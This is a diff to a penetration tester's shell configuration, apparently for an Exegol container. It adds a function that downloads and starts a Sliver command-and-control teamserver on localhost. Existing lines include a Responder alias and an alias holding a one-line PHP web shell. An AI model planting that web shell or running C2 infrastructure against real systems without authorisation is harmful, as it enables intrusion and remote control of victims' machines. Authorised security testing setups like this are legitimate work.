@@ -11,3 +11,41 @@ alias responder='sudo responder -I eth0 -wFb'
 alias phpshell='echo "<?php system(\$_GET[\"cmd\"]); ?>" | xclip -selection clipboard && echo "Shell PHP copié !"'
 alias cls='clear'
 alias sstimap='/opt/tools/SSTImap/sstimap.py'
+
+# --- Sliver GUI teamserver ---
+# The sliver-gui binary is a CLIENT built against Sliver v1.7.3 protobufs. It needs a
+# matching v1.7.3 teamserver (the Sliver bundled in Exegol is older and breaks Generate
+# due to protobuf field mismatch). This helper downloads the v1.7.3 server on first call
+# (arch-aware, ~260MB, cached in the persistent my-resources mount so it is fetched once),
+# unpacks its assets into an isolated root, generates an operator config and starts the
+# gRPC daemon on 127.0.0.1:31337 — without touching Exegol's bundled Sliver.
+# Usage: run 'sliver-gui-server', then 'sliver-gui' → Pick config /root/op17.cfg → Connect.
+sliver-gui-server() {
+    local ROOT="/root/.sliver-17"
+    local BIN="/opt/my-resources/bin/sliver-server-1.7.3"
+    local CFG="/root/op17.cfg"
+    local arch pkgarch
+    arch="$(uname -m)"
+    case "$arch" in
+        x86_64)        pkgarch="amd64" ;;
+        aarch64|arm64) pkgarch="arm64" ;;
+        *) echo "[-] Architecture non supportée: $arch"; return 1 ;;
+    esac
+    if [ ! -x "$BIN" ]; then
+        echo "[*] Téléchargement sliver-server v1.7.3 (${pkgarch}, ~260MB)..."
+        wget -q "https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-${pkgarch}" -O "$BIN" \
+            && chmod +x "$BIN" || { echo "[-] Download échoué"; rm -f "$BIN"; return 1; }
+    fi
+    if [ ! -d "$ROOT" ]; then
+        echo "[*] Unpack des assets (cross-compilers) dans ${ROOT}..."
+        SLIVER_ROOT_DIR="$ROOT" "$BIN" unpack --force
+    fi
+    echo "[*] Génération de la config opérateur..."
+    SLIVER_ROOT_DIR="$ROOT" "$BIN" operator -n op -l 127.0.0.1 -p 31337 --permissions all -s "$CFG"
+    pkill -f 'sliver-server-1.7.3 daemon' 2>/dev/null
+    nohup env SLIVER_ROOT_DIR="$ROOT" "$BIN" daemon -l 127.0.0.1 -p 31337 >/tmp/sliver17.log 2>&1 &
+    sleep 1
+    echo "[+] Teamserver v1.7.3 up → 127.0.0.1:31337  (log: /tmp/sliver17.log)"
+    echo "[+] Config opérateur     → ${CFG}"
+    echo "[+] Lance la GUI: sliver-gui   (Pick config → ${CFG} → Connect)"
+}
